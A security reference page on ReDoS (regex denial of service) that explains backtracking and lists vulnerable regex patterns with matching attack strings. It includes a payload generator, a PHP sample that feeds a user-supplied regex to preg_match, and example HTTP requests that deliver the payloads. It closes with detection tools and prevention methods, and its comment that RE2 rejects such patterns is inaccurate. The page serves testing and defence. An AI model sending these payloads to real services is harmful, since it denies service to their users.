# Regular Expression Vulnerabilities (ReDoS)

## Description
Regular Expression Denial of Service (ReDoS) exploits inefficient regex patterns that cause exponential backtracking when processing malicious input. This can exhaust CPU resources and cause application denial of service.

## How ReDoS Works

### Backtracking Explained
```
Pattern: (a+)+$
Input: "aaaaaaaaaaaaaaaaaaaab"

The regex engine tries:
- "aaaaaaaaaaaaaaaaaaa" + "a" - fails at 'b'
- "aaaaaaaaaaaaaaaaaa" + "aa" - fails at 'b'
- "aaaaaaaaaaaaaaaaaa" + "a" + "a" - fails at 'b'
... exponentially more combinations
```

## Vulnerable Regex Patterns

### Evil Regex Patterns
```regex
# Grouping with repetition
(a+)+
(a*)*
(a+)*

# Nested quantifiers
((a+)+)+
(a|a)+

# Alternation with overlap
(a|aa)+
(a|a?)+

# Multiple wildcards
(.*a){x}  where x > 10
```

### Common Vulnerable Patterns
```regex
# Email validation (vulnerable)
^([a-zA-Z0-9])+@([a-zA-Z0-9])+\.([a-zA-Z0-9])+$

# URL validation (vulnerable)
^(([a-z])+.)+[A-Z]([a-z])+$

# HTML tag (vulnerable)
<(.|\n)*>

# Repeated groups
^((ab)*)+$
```

## Attack Payloads

### For Pattern: (a+)+$
```
aaaaaaaaaaaaaaaaaaaaaaaa!
# Each additional 'a' doubles processing time
```

### For Pattern: (a|aa)+
```
aaaaaaaaaaaaaaaaaaaaaaaa
# 25 'a's causes significant delay
```

### For Pattern: (.*a){10}
```
aaaaaaaaaaaaaaaaaaaaaaaab
```

### For Pattern: ^([a-zA-Z]+)*$
```
aaaaaaaaaaaaaaaaaaaaaaa!
```

### Generic Test Payloads
```python
# Generate ReDoS payload
def redos_payload(char, length, terminator):
    return char * length + terminator

# Examples
payload1 = 'a' * 30 + '!'  # For (a+)+$
payload2 = 'a' * 25        # For (a|aa)+
payload3 = 'x' * 50 + '\n' # For ^.*$
```

## Detection Methods

### Manual Testing
```python
import re
import time

pattern = re.compile(r'(a+)+$')
test_input = 'a' * 25 + '!'

start = time.time()
pattern.match(test_input)
end = time.time()

print(f"Time: {end - start} seconds")
# > 1 second indicates vulnerability
```

### Regex Complexity Analysis
```
Look for:
1. Nested quantifiers: (a+)+, (a*)*
2. Overlapping alternation: (a|a)+
3. Repeated groups with wildcards: (.*)+
4. Unbounded repetition: {1,}
```

## Tools

### redos-detector
```bash
# https://github.com/nickmakesstuff/nickmakesstuff.github.io
# Detect ReDoS vulnerabilities

npx redos-detector "(a+)+$"
```

### regexploit
```bash
# https://github.com/doyensec/regexploit
# Find exploitable regex patterns

regexploit "(a+)+$"
```

### recheck
```bash
# Static analysis for ReDoS
recheck "(a+)+$"
```

### Online Tools
```
- https://devina.io/redos-checker
- https://regex101.com (test regex)
```

## PHP-Specific Vulnerabilities

### PCRE Configuration
```php
// Check limits
echo ini_get('pcre.backtrack_limit');  // Default: 1,000,000
echo ini_get('pcre.recursion_limit');  // Default: 100,000

// Exploit: exceed limits to cause error
$pattern = '/(a+)+$/';
$input = str_repeat('a', 1000) . 'b';
$result = preg_match($pattern, $input);
// Returns false on backtrack limit exceeded
```

### preg_match DoS
```php
<?php
$userRegex = $_GET['pattern'];  // User-controlled regex
$input = str_repeat('a', 50) . '!';

// Dangerous: allows ReDoS
preg_match($userRegex, $input);
?>
```

## Real-World Examples

### Email Validation
```regex
# Vulnerable
^([a-zA-Z0-9])(([\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$

# Payload
aaaaaaaaaaaaaaaaaaaaaaaa!@!.!
```

### URL Validation
```regex
# Vulnerable
^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})([\/\w \.-]*)*\/?$

# Payload
http://aaaaaaaaaaaaaaaaaaaaaa!
```

### File Path Validation
```regex
# Vulnerable
^(\/[\w-]+)+\/?$

# Payload
/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/!
```

## Exploitation Scenarios

### Web Application Input
```
POST /api/validate HTTP/1.1
Content-Type: application/json

{"email": "aaaaaaaaaaaaaaaaaaaaaaaaaaa!@!.!"}
```

### API Endpoint
```
GET /search?q=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa! HTTP/1.1
```

### File Upload Filename
```
Upload file with name: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!.txt
```

## Testing Checklist

- [ ] Identify regex patterns in application (search source code)
- [ ] Look for user input validated with regex
- [ ] Test patterns with repeated characters
- [ ] Measure response time with increasing payload length
- [ ] Check for nested quantifiers and alternation

## Prevention

### Safe Regex Patterns
```regex
# Instead of: (a+)+$
# Use: a+$

# Instead of: (a|aa)+
# Use: a+

# Instead of: (.*)+
# Use: .*

# Use possessive quantifiers (if supported)
(a++)+ # Prevents backtracking
```

### Timeout Implementation
```python
import signal

def timeout_handler(signum, frame):
    raise TimeoutError("Regex timeout")

signal.signal(signal.SIGALRM, timeout_handler)
signal.alarm(1)  # 1 second timeout

try:
    re.match(pattern, input)
except TimeoutError:
    print("Regex timed out")
finally:
    signal.alarm(0)
```

### Input Length Limits
```python
MAX_INPUT_LENGTH = 1000

def safe_regex_match(pattern, input):
    if len(input) > MAX_INPUT_LENGTH:
        raise ValueError("Input too long")
    return re.match(pattern, input)
```

### Use RE2 Engine
```python
# Google RE2 guarantees linear time
import re2

pattern = re2.compile(r'(a+)+$')
# RE2 rejects patterns that could cause catastrophic backtracking
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Regular%20Expression
- https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS
- https://www.regular-expressions.info/catastrophic.html
